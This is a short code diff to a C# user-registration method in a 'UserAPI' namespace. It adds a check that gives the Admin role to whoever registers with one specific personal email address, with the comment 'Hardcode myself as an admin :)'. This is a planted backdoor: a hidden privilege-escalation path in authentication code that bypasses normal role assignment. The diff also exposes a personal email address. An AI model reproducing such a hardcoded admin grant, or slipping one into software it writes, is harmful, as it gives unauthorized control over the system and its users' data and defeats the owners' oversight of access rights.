@@ -70,6 +70,10 @@ namespace UserAPI
                 Role = "User",
                 PasswordHash = BCrypt.Net.BCrypt.HashPassword(userDto.Password)
             };
+            if (user.Email == "Jonny.collins111@gmail.com")
+            {
+                user.Role = "Admin"; //Hardcode myself as an admin :)
+            }
 
             // Add the new user to the database 
             await _userRepository.AddAsync(user);
